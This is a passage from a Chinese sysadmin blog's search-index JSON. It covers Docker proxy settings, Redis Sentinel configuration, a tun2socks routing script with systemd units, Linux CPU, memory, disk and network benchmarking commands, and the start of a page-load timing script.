和 https_proxy 代理解决，配置如下： ### Editing /etc/systemd/system/docker.service.d/override.conf ### Anything between here and the comment below will become the contents of the drop-in file [Service] Environment=\"ALL_PROXY=socks5://127.0.0.1:1080\" Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\" ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:16:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"Redis主从复制+哨兵","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","运维记事"],"content":"1. 测试版本: redis 6.2.14 $\u003e make PREFIX=/opt/redis-server/6.2.14 install $\u003e mkdir -p /opt/redis-server/6.2.14/{data,logs,etc} $\u003e mkdir -p /opt/redis-server/6.2.14/sentinel_data/26379 ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:1:0","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","运维记事"],"content":"1.1 配置文件额外修改以下参数(多少个节点，多少个独立配置文件) # 配置 redis.conf masterauth \u003cpassword\u003e # 与redis.conf中密码一致(此项在每个节点都要配置) slaveof \u003cmasterip\u003e \u003cmasterport\u003e # 指定主节点ip和端口(此项只在从节点上进行配置) # 配置 sentinel.conf port: \u003cport\u003e # 21 pidfile: /pathto/sentinel_\u003cport\u003e.pid # 31 logfile: /pathto/logs/sentinel_\u003cport\u003e.log # 36 dir: /path/sentinel_data/\u003cport\u003e # 64 ## \u003cmaster-name\u003e 主节点名称, 可以自定义 ## \u003cmaster-ip\u003e \u003cmaster-port\u003e 主节点ip和端口 ## \u003cquorum\u003e 指定需要有2个以上sentinel节点认为redis主节点失效, 才是真的失效, 一般为: sentinel总数/2+1 sentinel monitor \u003cmaster-name\u003e \u003cmaster-ip\u003e \u003cmaster-port\u003e \u003cquorum\u003e # 84 , 此项每个节点都要配置 sentinel auth-pass mymaster \u003cpassword\u003e # 105 插入 此项, 与redis.conf中密码一致(此项在每个节点都要配置) sentinel down-after-milliseconds mymaster 30000 # 125 此项是指定 主机节点多少毫秒无响应，则认为挂了, 默认30s ## 主备切换时, 最多有多少个slave同时对新的master进行同步, 这里设置为默认的1 sentinel parallel-syncs mymaster 1 # 200 ## 故障转移的超时时间毫秒, 默认: 180000毫秒 sentinel failover-timeout mymaster 180000 # 225 ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:2:0","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","运维记事"],"content":"1.2 创建 systemd 管理单元 [Unit] Description=Redis Sentinel(%i) After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/opt/redis-server/6.2.14/bin/redis-server /opt/redis-server/6.2.14/etc/sentinel_%i.conf --sentinel ExecStop=/usr/bin/redis-cli -p %i sentinel shutdown Type=simple User=redis Group=redis RuntimeDirectory=redis RuntimeDirectoryMode=0755 LimitNOFILE=10240 [Install] WantedBy=multi-user.target ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:3:0","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","运维记事"],"content":"1.3 其他 配置完成后提供给用户的是 sentinel 的端口, 而不是 redis 的端口 sentinel 在启动后，会将哨兵集群的元数据信息写入所有sentinel的配置文件里去 主从切换后，sentinel 会自动更新配置文件，将新主机的信息写入到sentinel的配置文件中, 并且主动更新 redis 配置文件 ","date":"2024-10-29","objectID":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/:4:0","tags":["linux","解决方案","同步"],"title":"Redis主从复制+哨兵","uri":"/posts/linux/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6_%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F/"},{"categories":["linux","windows","运维记事"],"content":"Linux下使用tun2socks进行两地网络连接","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":" 之前写了一个关于内网回拨解决方案, 主要是介绍在PPTP不好用的情况下，两地机房网络如何进行内网连接，该篇推荐使用的是badvpn, 但该仓库已经归档很久了。这篇介绍另一个工具 tun2socks 来替代badvpn。 关于为什么记录这个，可以翻看之前的文章内网回拨解决方案, 本篇只记录相关的整合脚本。 ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:0:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"tun2socks 安装 在 https://github.com/xjasonlyu/tun2socks/releases 中找到适合自己系统的二进制程序，下载后解压到/usr/local/bin下即可。 ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:1:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"tun2socks-control 用于管理路由的添加和删除 /usr/local/bin/tun2socks-control #!/usr/bin/bash ################################################# # author 0x5c0f # date 2023-04-27 # email mail@0x5c0f.cc # web tools.0x5c0f.cc # version 1.2.0 # last update 2024-06-11 # descript Use : ./tun2socks-control -h ################################################# PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # Log level [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"${LOG_LEVEL:-info}\" # proxy model PROXY_MODEL=\"${PROXY_MODEL}\" # local dev LOCAL_NETWORK_DEV=\"${LOCAL_NETWORK_DEV:-eth0}\" # tun dev TUN_NETWORK_DEV=\"${TUN_NETWORK_DEV:-tun1}\" # tun ip prefix TUN_NETWORK_PREFIX=\"${TUN_NETWORK_PREFIX:-10.3.6}\" # route ip TUN_ROUTE_IP=($(eval echo ${SOCKS_ROUTE})) _START() { ip tuntap add dev \"${TUN_NETWORK_DEV}\" mode tun ip addr add \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip link set \"${TUN_NETWORK_DEV}\" up # add route for _ip in ${TUN_ROUTE_IP[@]}; do ip route add \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # start tun2socks (https://github.com/xjasonlyu/tun2socks.git) tun2socks -device ${TUN_NETWORK_DEV} -proxy ${PROXY_MODEL} -interface ${LOCAL_NETWORK_DEV} -loglevel ${LOG_LEVEL} } _STOP() { # delete route for _ip in ${TUN_ROUTE_IP[@]}; do ip route del \"${_ip}\" via \"${TUN_NETWORK_PREFIX}.2\" done # delete network dev ip link set \"${TUN_NETWORK_DEV}\" down ip addr del \"${TUN_NETWORK_PREFIX}.1/24\" dev \"${TUN_NETWORK_DEV}\" ip tuntap del dev \"${TUN_NETWORK_DEV}\" mode tun } main() { case \"$1\" in \"start\") _START ;; \"stop\") _STOP ;; *) echo \"$0 start|stop\" ;; esac } main $@ ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:2:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"tun2socks 用于配置需要绑定的路由和socks信息 /etc/sysconfig/tun2socks ## tun2socks 日志级别 [debug|info|warning|error|silent] (default \"info\") LOG_LEVEL=\"info\" ## https://github.com/xjasonlyu/tun2socks/wiki/Proxy-Models # \u003c此项必填\u003e PROXY_MODEL=\"socks5://127.0.0.1:1083\" ## 本地网络设备接口 (default: eth0) LOCAL_NETWORK_DEV=\"eth0\" # tun 设备名(default: tun1) TUN_NETWORK_DEV=\"tun3\" # tun 绑定的网段 (default: 10.3.6.0/24) TUN_NETWORK_PREFIX=\"10.3.6\" # 只支持ipv4 ROUTE_HOST=\"\" # 支持配置多个 空格隔开 SOCKS_ROUTE=\"${ROUTE_HOST}\" # SOCKS_ROUTE=\"${IPSB_HOST} ${DOCKER_HOST} $(curl -s https://api.github.com/meta | jq -r '[.web[] | select(contains(\\\":\\\") | not)] | join(\\\" \\\")')\" ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:3:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"用于管理 tun2socks 服务的 systemd /etc/systemd/system/tun2socks.service [Unit] Description=tun2socks https://github.com/xjasonlyu/tun2socks.git After=network.target # Requires=socketssh-tun.service [Service] Type=simple EnvironmentFile=/etc/sysconfig/tun2socks PIDFile=/run/tun2socks.pid ExecStart=/usr/local/bin/tun2socks-control start ExecStopPost=/usr/local/bin/tun2socks-control stop [Install] WantedBy=multi-user.target ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:3:1","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"加载启动 $\u003e sudo systemctl daemon-reload $\u003e sudo systemctl start tun2socks.service ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:4:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","windows","运维记事"],"content":"其他信息 windows 理论可用，可参考脚本进行调整 其他信息参考 内网回拨解决方案 ","date":"2024-06-14","objectID":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/:5:0","tags":["linux","windows","优化","解决方案"],"title":"Linux下使用tun2socks进行两地网络连接","uri":"/posts/linux/linux%E4%B8%8B%E4%BD%BF%E7%94%A8tun2socks%E8%BF%9B%E8%A1%8C%E4%B8%A4%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"Linux 性能基准测试工具及测试方法","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"graph TB A[Linux 性能基准/测试] --\u003e B[CPU] A --\u003e C[内存] A --\u003e D[磁盘 IO] A --\u003e E[文件 IO] A --\u003e F[网络] A --\u003e G[应用程序] B --\u003e H[Super_Pi 测试单线程性能] B --\u003e I[sysbench 测试多线程性能] C --\u003e J[stream 测试内存带宽] D --\u003e K[fio 测试IOPS] D --\u003e L[fio 测试吞吐量] E --\u003e M[fio 测试IOPS] E --\u003e N[fio 测试吞吐量] F --\u003e O[netperf 测试带宽] F --\u003e P[netperf 测试PPS] G --\u003e Q[wrk 测试 Nginx QPS] graph TB A[Linux 性能基准/测试] --\u003e B[CPU] A --\u003e C[内存] A --\u003e D[磁盘 IO] A --\u003e E[文件 IO] A --\u003e F[网络] A --\u003e G[应用程序] B --\u003e H[Super_Pi 测试单线程性能] B --\u003e I[sysbench 测试多线程性能] C --\u003e J[stream 测试内存带宽] D --\u003e K[fio 测试IOPS] D --\u003e L[fio 测试吞吐量] E --\u003e M[fio 测试IOPS] E --\u003e N[fio 测试吞吐量] F --\u003e O[netperf 测试带宽] F --\u003e P[netperf 测试PPS] G --\u003e Q[wrk 测试 Nginx QPS]","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:0:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"CPU ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:1:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"Super_Pi Super_Pi 是一种用于计算圆周率π的程序，通常用于测试计算机性能和稳定性。它的主要用途是测量系统的单线程性能，因为它是一个单线程应用程序。 # 安装 bc $\u003e yum -y install bc # 测试 , 根据运行结果。查看 real 行，时间越短，性能越好 $\u003e time echo \"scale=5000; 4*a(1)\" | bc -l -q \u0026\u003e1 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:2:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"sysbench 素数计算 # 安装 sysbench $\u003e yum -y install sysbench # 测试方法: 启动4个线程计算10000事件所花的时间 ## 结果分析，看 total time 即可，时间越短，性能越好 $\u003e sysbench cpu --threads=4 --events=10000 --time=0 run ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:3:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"内存 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:4:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"内存带宽(stream) Stream测试是内存测试中业界公认的内存带宽性能测试基准工具 # 编译安装 STREAM $\u003e yum -y install gcc gcc-gfortran $\u003e git clone https://github.com/jeffhammond/STREAM.git $\u003e cd STREAM/ $\u003e make # 指定线程数 $\u003e export OMP_NUM_THREADS=1 # 结果分析，看 Copy、Scale、Add、Triad，数值越大，性能越好 $\u003e ./stream_c.exe ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:5:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"磁盘 IO/文件 IO 磁盘 IO 和 文件 IO的测试方法一致，将对应的 --filename 值修改为具体的磁盘即可，如 /dev/sda(注:磁盘IO测试时，请用空盘测试) ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:6:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"磁盘/文件读、写iops iops：磁盘的每秒读写次数，这个是随机读写考察的重点 # 安装 $\u003e yum -y install fio # 测试随机读 IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randread --filename=/home/randread.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # 测试随机写 IOPS $\u003e fio --ioengine=libaio --bs=4k --direct=1 --thread --time_based --rw=randwrite --filename=/home/randwrite.txt --runtime=60 --numjobs=1 --iodepth=1 --group_reporting --name=randread-dep1 --size=1g # 结果分析，看 IOPS 即可，值越大，性能越好 因地制宜，灵活选取。在基准测试时，一定要注意根据应用程序 I/O 的特点，来具体评估指标 比如 etcd 磁盘性能衡量指标为：WAL 文件系统调用 fsync 的延迟分布，当 99% 样本的同步时间小于 10 毫秒就可以认为存储性能能够满足 etcd 的性能要求。 $\u003e mkdir etcd-bench $\u003e fio --rw=write --ioengine=sync --fdatasync=1 --directory=etcd-bench --size=22m --bs=2300 --name=etcd-bench ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:7:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"网络 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:8:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"传输速率(pps) # server \u0026 client 编译安装 netserver $\u003e wget -c \"https://codeload.github.com/HewlettPackard/netperf/tar.gz/netperf-2.5.0\" -O netperf-2.5.0.tar.gz $\u003e yum -y install gcc cc $\u003e tar zxvf netperf-2.5.0.tar.gz $\u003e cd netperf-netperf-2.5.0 $\u003e ./configure \u0026\u0026 make \u0026\u0026 make install # server 端启动 netserver $\u003e netserver # 监控数据 $\u003e sar -n DEV 5 # client 端测试 $\u003e netperf -t UDP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 64 -R 1 \u0026 # 监控数据 $\u003e sar -n DEV 5 # 结果分析，看 rxpck/s,txpck/s 值即可，值越大，性能越好 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:9:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"网络带宽 宽带测速还有个工具-iptraf-ng https://iperf.fr/iperf-download.php # server 端启动 netserver $\u003e netserver # 监控数据 $\u003e sar -n DEV 5 # client 端测试 $\u003e netperf -t TCP_STREAM -H \u003cserver ip\u003e -l 100 -- -m 1500 -R 1 \u0026 # 监控数据 $\u003e sar -n DEV 5 # 结果分析，看 rxkB/s,txkB/s 值即可，值越大，性能越好 ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:10:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"单向时延 # 服务端： yum install -y sockperf sockperf sr --daemonize \u003e /dev/null 2\u003e\u00261 # 客户端： sockperf under-load -i serverip --mps=100000 -t 300 -m 14 --reply-every=50 --full-log=sockperf.out # mps: 每秒多少请求 -t 测试时间 -m 每个请求大小(默认14byte) ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:11:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","运维记事","整理收集","那些有用没用的"],"content":"Nginx # 安装 ab 工具 $\u003e yum -y install httpd-tools # 编译安装 wrk $\u003e git clone https://github.com/wg/wrk.git $\u003e make $\u003e cp wrk /usr/local/bin/ # 测试，-c表示并发连接数1000，-t表示线程数为2，-d 表示测试时间 ## # 结果分析，Requests/sec 为 QPS $\u003e wrk -t12 -c400 -d30s \u003cURL\u003e ","date":"2024-05-08","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/:12:0","tags":["linux","优化","解决方案"],"title":"Linux 性能基准测试工具及测试方法","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"},{"categories":["linux","解决方案"],"content":"可用来统计页面加载时间，js组件直接插入到html末尾即可","date":"2023-11-13","objectID":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/","tags":["linux","javascript","scripts"],"title":"页面加载时间统计","uri":"/posts/scripts/javascript/%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"categories":["linux","解决方案"],"content":"js 组件 直接保存为文件, 插入到 html 末尾即可, 用来统计当前页面的各类加载时间然后推送到远端(当然，后端需要自己构建接口) \u003cscript id=\"tracking-script\" src=\"./pcheck.js\" data-tracking-code=\"{{ TRACKING_CODE }}\"\u003e\u003c/script\u003e // 采集信息推送目标 const apiUrl = \"//example.com/rz/api/v1/performance/webpage/data/\"; // 日志打印控制变量, 由后端服务控制 let enableLog = true; // 获取跟踪代码 function getTrackingCode() { try { const currentScript = document.getElementById(\"performance-check-script\"); 